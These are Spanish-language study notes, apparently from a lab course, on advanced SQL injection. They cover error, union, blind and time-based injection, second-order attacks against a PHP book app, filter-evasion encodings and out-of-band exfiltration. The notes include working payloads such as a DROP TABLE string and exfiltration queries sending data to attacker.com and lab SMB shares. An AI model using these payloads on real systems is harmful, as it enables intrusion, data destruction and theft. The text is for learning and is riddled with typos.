# Introducción

SQL Injectión es uno de los recuros de las aplicacion web en la que las vulnerabilidades son las más severas. Estos actores cuanto atacan explotan la web y ejecutan consultas SQL arbitrarias, teniendo acceso a la base de daots, exfiltración de daots, manipulación de datos, o control de aplicaciones. 

Aprenderemos sobre técnicas, entender ataques, vectores, estrategias, etc.

# Objetivos de aprendizaje

- SQJ Injection Second-Order
- Evasion de Filtros
- Out-Of-Band SQL Injection
- Técnicas de automatización
- Mitigación

# Resumen rápido

![image](https://github.com/user-attachments/assets/6f304655-3897-47fd-9418-428186aef5a1)

## In-Band SQL Injection

Está técnica es la considerada más común y sencilla de ataque de Sql, el atacante usa el mismo canal de comunicación para la injección y la devolución de datos. Hay dos tipos primarios dentro de dicha injeección

- Error-Based: El atacante manipula la consula para producir un error en la base de datos. Este error contiene información sobre la estructura, por ejemplo:

```
SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))
```

Si la versión nos devuelve un error, nos da información sobre la base de datos

- Union-Based: El atacante usa UNION SQL para combinar operaciones y seleccionar diferentes resultados, devolviendo datos de diferentes tablas

```
SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin
```

## Inferential (BLIND)

Este tipo de injección no transfiere datos directamente a las aplicaciones web, haciendo que la explotación sea un reto mayor, los atacantes mandan payloads y observan como la aplicación responde a tiempos dando información de ello. Hay dos tipos:

- Boolean-Based: El atacante manda una consulta a la base de datos, forzando a la aplicación devolver un resultado diferente que basado en condición True o false. Analizando la respuesta, el atacante puede saber si hay payload o no.

```
SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)
```

- Time-Based: El atacante manda una consulta, especifica y responde un tiempo especifico si la respuesta es True.

```
SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--
```

## Out-of-Band

Se usa cuando un atacante no usa el mismo canal para hacer el ataque y que le devuelve resultados o el servidor es inestable. Estas tecnicas hacen peticiones al servicios siendo (http o DNS) mandando este tipo de consultas. Normalmente HTTP 

Este tipo de injecciones son las mas avanzadas y complicadas. Para entender esta tecnica es crucial identificas y mitigar vulnerabilidades SQL en la web.

# Inyecciones SQL de segundo orden

También conocida como injección SQL almacenada, aprovecha vulnerabilidades en la que la entrada del usuario se guarda y posteriormente se almacena en la BD o la aplicacion. Este tipo de ataque es un poco mas complicado porque no genera información al momento y no sabes si el input ha sido valido. 

![image](https://github.com/user-attachments/assets/c6767c7b-4872-4a97-bf93-9b3d88741a1c)

## Impacto

El peligro de la inyección SQL de segundo orden reside en su capacidad de eludir las defensas típicas del frontend, como la validación de entrada básica o la limpieza, que solo se producen en el punto de entrada inicial de datos. Dado que la carga útil no causa interrupciones durante el primer paso, se puede pasar por alto hasta que sea demasiado tarde, lo que hace que el ataque sea particularmente sigiloso.

### Ejemplo

Una aplicación de reviews de libros. Esta aplicación añade libros via "add.php" los usuarios promptean los detales de libro y lo añaden a la base de datos. Recoge datos de SSN, nombre y autor. Vamos a añadir un libro con los detalles que queramos

![image](https://github.com/user-attachments/assets/6508a044-e884-4178-8af6-c2cf174f24ce)

Como sabemos identificar la vulnerabilidad no es nada fácil, analicemos el código

```
if (isset($_POST['submit'])) {

    $ssn = $conn->real_escape_string($_POST['ssn']);

    $book_name = $conn->real_escape_string($_POST['book_name']);

    $author = $conn->real_escape_string($_POST['author']);

    $sql = "INSERT INTO books (ssn, book_name, author) VALUES ('$ssn', '$book_name', '$author')";

    if ($conn->query($sql) === TRUE) {

        echo "<p class='text-green-500'>New book added successfully</p>";

    } else {

        echo "<p class='text-red-500'>Error: " . $conn->error . "</p>";

    }

}
```

El código usa "real_escape_string()" metodo para escapar de caracteres especiales. Mientras este metodo puede mitigar fallos de un SQL injection como "" o -, esto no es seguro para el second order. La falla de esto es no parametrizar, cuando los datos se insertan en "real_escape_string()" pueden incluir caracteres de carga útil que no causan daño inmediato pero que pueden activarse en una recuperación posterior y usarse en otra consulta SQL

Ejemplo:

Introducir un nombre de libro y meterle de nombre un '; DROP TABLE books; --

Ahora vamos a ver como funciona el código a la hora de actaulizar un contenido de el SQL

```
if ( isset($_POST['update'])) {
    $unique_id = $_POST['update'];
    $ssn = $_POST['ssn_' . $unique_id];
    $new_book_name = $_POST['new_book_name_' . $unique_id];
    $new_author = $_POST['new_author_' . $unique_id];

    $update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');";
..
...
```
El script empieza checkeando si la consulta es POST y si el boton update ha sido pulsado, indicando esto se empeza a actualizar.

Las variables (ssn, new_book_name, new_author) son usadas como construicciones SQL para actualizar los detalles

El scripts usa "multi_query" para ejecutar multiples consultas. 

## Preparar Payload

Ahora que sabemos como funciona vamos a hacerlo 

```
UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';
```

```
12345'; UPDATE books SET book_name = 'Hacked'; --
```

Cuando el varlos actualiza la queri, efectiavemente despues del 12345 hay un nuevo coando, cambiando el nombre de llibro y llamandose "hacked"

![image](https://github.com/user-attachments/assets/7cc73ded-08ba-4379-b0bc-867ab9b039a9)

Cuando nos vayamos al update por ejemplo un "update.php" u actualizemos el payalod veremos lo que pasa

Este es el código que se utilizaria

```
UPDATE books SET book_name = 'Testing', author = 'Hacker' WHERE ssn = '12345'; Update books set book_name ="hacked"; --'; INSERT INTO logs (page) VALUES ('update.php');
```

El doble -- se utiliza como comentario en SQL, todo lo posterior a ello se  ignora

![image](https://github.com/user-attachments/assets/49c4aac8-f3e3-4b95-9bfe-36d6944fd0d7)

# Técnicas de evasión por filtros

En Injecciones Avanzadas, evadir filtros es crucial para garantizar una buena vulnerabilidad y su posterior explotación. Las aplicaciones modernas implementar defensas por sensibilidad o ataques comunes, haciendo injecciones simples nunca conseguiremos nada. Como pentester, nos deberemos adaptar a hacer técnicas más sofisticadas. Esta sección iremos viendo meotodos, incluid caracteres codificados, no utilizas '', y escenarios

## Codificacion de Caracteres

- URL Encoding: Metodo comunmente usado cuando queremos que un carcater es representado como (%). Por ejemplo un payload ' OR 1=1-- puede ser al a %27%20OR%201%3D1-- ayuda a que las aplicaiones no detecten
- Codificación Hexadecimal: Es otra técnica efectiva para construir SQL usando valores hexadecimales. Para la instancia, la consulta SELECT * FROM users WHERE name = 'admin' puede ser codficada a SELECT * FROM users WHERE name = 0x61646d696e
- Unicode Enconding: Esto es representar todos los caracteres como unicos por ejemplo admin =   \u0061\u0064\u006d\u0069\u006e este metodo se usa para checkear filtros o etc

### Ejemplos

Tenemos un código

PHP

```
$book_name = $_GET['book_name'] ?? '';
$special_chars = array("OR", "or", "AND", "and" , "UNION", "SELECT");
$book_name = str_replace($special_chars, '', $book_name);
$sql = "SELECT * FROM books WHERE book_name = '$book_name'";
echo "<p>Generated SQL Query: $sql</p>";
$result = $conn->query($sql) or die("Error: " . $conn->error . " (Error Code: " . $conn->errno . ")");
if ($result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
...
..
```

JS

```
function searchBooks() {
const bookName = document.getElementById('book_name').value;
const xhr = new XMLHttpRequest();
xhr.open('GET', 'search_books.php?book_name=' + encodeURIComponent(bookName), true);
   xhr.onload = function() {
       if (this.status === 200) {
           document.getElementById('results').innerHTML = this.responseText;
```

Si vemos los desarroladores han implementado pequeñas defensas para ataques SQL revomiendo parametros clave como "OR, AND, UNION y SELECT" El filtro usa "str_replace", cuando inputemaos esto simplemente lo quita.

### Preparar Payload

Vamosa  usar un proceso paso a paso

![image](https://github.com/user-attachments/assets/34bc80ac-637d-42d2-99e7-a0911f0bbb98)

Vamos a poner que queremos hacer algo

![image](https://github.com/user-attachments/assets/cdda237c-bfba-4f0b-90f1-8246ff1ae57b)

Nos dice que tenemos un error

![image](https://github.com/user-attachments/assets/dc7756c0-87b3-402a-a31b-ad0a0372eee9)

Como vemos la funcion anteriormente mencionada nos quita la palabra clave ahora vamos a jugar con la codificacion

Para bypasear este filtro haremos un simple payload  1%27%20||%201=1%20--+

- %27 = '
- %20 = ()
- | | = OR
- %3D = =
- %2D%2D = --

Podemos usar cyberchief para codificar muy fácil la consulta

## No-Quote

Esta injección usa filtros singulares o doblues quotas o escapes

- Usar Valores Numericos: Una forma de usar valores numericos o tros datos no tiene porque llevar quota. Por ejemplo ' OR '1'='1, el atacante puede hacer perfectmanet eO 1=1 en el contexto cuando las quotas no son necesarias
- Usan comentarios SQL: Otro es por ejemplo admin'-- a admin--,
- Usar CONCAT(): Los atacante spueden contstruir strings sin quitas por ejemplo CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)

## Sin espacios

- Comentarios que remplazan los espacios: Un metodo comuen es usar los comentarios /**/ replazando espacios. por ejemplo SELECT * FROM users WHERE name = 'admin', el atacante usa SELECT/**//*FROM/**/users/**/WHERE/**/name/**/='admin'. Los comentarios SQL remplzaran los esptacios de la consulta
- Tab o nuevos caracteres: Se puede usar \t para tabular o \n para substituir espacios SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'
- Caracteres Alternativos: Uno de los metodos efectivos se usan alternatios Url-Encoders como %09 o %OA

![image](https://github.com/user-attachments/assets/843790aa-542e-4993-8ab2-26cdc56e93e1)


# Out-of-band SQL Injection

Este tipo de tecnica lo usan los red teamers para filtrar datos o ejecutar codigo malicioso cuando directamente nos metodos tradicionales no funcionan. Cuando el atacante utiliza el mismo canal para atacar y recibir datos, esta injeccion utiliza canales separados para enviar el payload y recibir la respuesta. 


![image](https://github.com/user-attachments/assets/959ea548-fea6-4c0d-9075-25f208994566)

Una de las grandes ventajas es que es más sigilioso y rentalbe. Usa diferentes canales, los atacanates miniminal los riesgos de deteccion y de mantener una persistencia de conexion. El atacante injecta un SQL a la base de datos haceindo una consutla por ejemplo DNS. 

### PORQUE usar OOB

EN estos escenarios, oob canales activa canales para filtrar datos sin necesidad de tener feedback del servidor. Tiene mecanismos de seugirdad como procedimientos guardados, output codificado, aplicacion por nivel, respuestas directas. 

### Técnicas

MYSQL y MARIAdb

```
SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
```

Microsoft SQL server

```
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
```

Oracle

```
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;
```

### Ejemplos

HTTP

```
SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;.
```

DNS

SMB

```
SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';.
```

# Otras técnicas






